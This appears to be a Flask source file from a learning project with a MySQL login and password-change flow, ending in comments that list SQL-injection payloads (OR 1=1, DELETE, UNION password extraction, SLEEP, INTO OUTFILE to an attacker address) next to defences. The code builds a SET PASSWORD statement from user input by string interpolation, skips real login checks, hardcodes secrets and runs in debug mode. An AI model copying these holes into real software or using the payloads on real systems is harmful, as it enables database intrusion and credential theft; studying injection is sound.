from flask import Flask,session, jsonify,request,render_template,redirect,url_for
import json
from flask_mysqldb import MySQL
from utils.Utilitarios import Auditor,Utiles
from datetime import datetime,timedelta
from databases.databases import *


app=Flask(__name__)
app.config['MYSQL_HOST'] = '127.0.0.1'
app.config['MYSQL_USER'] = 'prueba'
app.config['MYSQL_PASSWORD'] = 'prueba'
app.config['MYSQL_DB'] = 'hr'
app.config['MYSQL_PORT'] = '3306'
app.config['SECRET_KEY'] = "akDFJ34mdfsYMH567sdf" # this must be set in order to use sessions
CargarBD(app.config)
mysql = MySQL(app)

Au=Auditor()

@app.route("/") # Envia al template login.html
def Raiz():
    # session['usuario']='prueba'    
    # session['clave']='prueba'    
    
    fecha=datetime.now()
    fe=str(fecha.year)+str(fecha.month)+str(fecha.day)
    
    return render_template("login.html")
@app.route("/v",methods=['POST']) # Verifica que no sea el usuario root y que las credenciales sean válidas
def Raiz1():
    # if request.method == 'POST':
    #     pw = request.form.get('pw')
    #     usua = request.form.get('usua')

    # app.config['MYSQL_USER'] = "admin"
    # app.config['MYSQL_PASSWORD'] = 'admin'
    
    try:
        # cur = mysql.connection.cursor()

        msgito="BIENVENIDO"
        regreso="/paso1"
        usua="admin"
        # logger.error('INFO: ingresa '+usua)
        Au.registra(30,msgito,usua )
        return render_template("alerta.html", msgito=msgito,regreso=regreso)
    except Exception as e:
        print("error "+str(e))
        return "error "+str(e)

@app.route("/paso1")
def Paso1():
    try:

        cur = mysql.connection.cursor()
        return render_template("paso1.html")
    except Exception as e:
        msgito="NO HA VALIDADO CREDENCIALES <paso1>"
        regreso="/"
        # logger.error('ERROR: '+msgito+' ')
        Au.registra(40,msgito,'')
        return render_template("alerta.html", msgito=msgito,regreso=regreso)


@app.route("/cpw")
def cpwd():
    if Utiles.ValidaSesion():
        msgito="SESION CADUCADA"
        regreso="/" 
        Au.registra(40,msgito,'')       
        return render_template("alerta.html", msgito=msgito,regreso=regreso)
    else:
        Au.registra(30,'Ingresa a cambiar clave','') 
        return render_template("clogin.html")
@app.route("/cpw1",methods=['POST'])
def cpwd1():
    try:
         
        if request.method == 'POST':
            pw1 = request.form.get('pw1')
            app.config['MYSQL_PASSWORD'] = pw1
            cur = mysql.connection.cursor()
    except Exception as e:
        msgito="CLAVE ANTERIOR NO COINCIDE <CPWD>"
        regreso="/" 
        Au.registra(40,msgito,'')       
        return render_template("alerta.html", msgito=msgito,regreso=regreso)
    
    
    if request.method == 'POST':
        pw2 = request.form.get('pw2')
        pw3 = request.form.get('pw3')
        if pw2 == pw3:
            pass
            # app.config['MYSQL_PASSWORD'] = pw1
            # cur = mysql.connection.cursor()
            # msgito="OK  <CPWD>"
            # regreso="/"        
            # return render_template("alerta.html", msgito=msgito,regreso=regreso)
        else:
            msgito="LAS NUEVAS CLAVES NO COINCIDEN"
            regreso="/" 
            Au.registra(40,msgito,'')       
            return render_template("alerta.html", msgito=msgito,regreso=regreso)
    if request.method == 'POST':
        pw2 = request.form.get('pw2')
        pw3 = request.form.get('pw3')
        usua = request.form.get('usua')
        if pw1==pw2:
            msgito="LA CLAVE NUEVA NO PUEDE SER LA ANTERIOR"
            regreso="/" 
            Au.registra(40,msgito,'')       
            return render_template("alerta.html", msgito=msgito,regreso=regreso)
        
    if not Utiles.ConsistenciaClave(pw2):
        msgito="Error: No cumple con las condiciones:\nAl menos debe haber Una Mayuscula, \nUn numero, Una minuscula,\n un caracter especial,\n una longitud minima de 12 caracteres"
        regreso="/"
        Au.registra(40,msgito,'')
        return render_template("alerta.html", msgito=msgito,regreso=regreso)
    
                    
    try:
        cur = mysql.connection.cursor()
        usua=app.config['MYSQL_USER']
        pwx=app.config['MYSQL_PASSWORD']
        print(usua)
        # GRANT ALTER, UPDATE ON hr.* TO jgalindos;
        # cur.callproc('ChangeUserPassword',[usua,pw2])
        sql=f"set password for '{usua}'@'localhost' = PASSWORD('{pw2}') "
        # sql1=([usua,pw2])
        # print(usua,pw2,sql)
        cur.execute(sql)
        mysql.connection.commit()
        msgito="CAMBIO SATISFACTORIO DE CLAVE "
        regreso="/"
        Au.registra(30,msgito,usua)
        return render_template("alerta.html", msgito=msgito,regreso=regreso)
        
    except Exception as e:
        msgito="FALLO CAMBIO DE CLAVE"
        regreso="/"
        Au.registra(40,msgito,'')
        return render_template("alerta.html", msgito=msgito,regreso=regreso)

@app.route('/logout')
def logout():
    session.clear()
    app.config['MYSQL_USER'] = 'prueba'
    app.config['MYSQL_PASSWORD'] = 'prueba'

    return redirect(url_for('/'))

# ' OR 1=1 --
# ';DELETE FROM USUARIOS;
# mm' UNION select contraseña from usuario where usuario='migma' --

# select * from user_table where
# username = 'admin';--' and password = 'mypassword'

# select * from user_table where
# username = 'admin' and
# password = 'password' or 1=1;--';

# select title, link from post_table
# where id < 10
# union
# select username, password
# from user_table; --;

# select * from comments
# WHERE post_id=1-SLEEP(15);

# select * from post_table
# into OUTFILE '\\MALICIOUS_IP_ADDRESSlocation'

# Escapar las Entradas del Usuario
# Utilizar Sentencias Preparadas
# error403 Forbidden

# https://learn.microsoft.com/es-es/sql/relational-databases/security/sql-injection?view=sql-server-ver16
# https://latam.kaspersky.com/resource-center/definitions/sql-injection

if __name__ == '__main__':   
    app.run(debug=True, port=5000,host='0.0.0.0')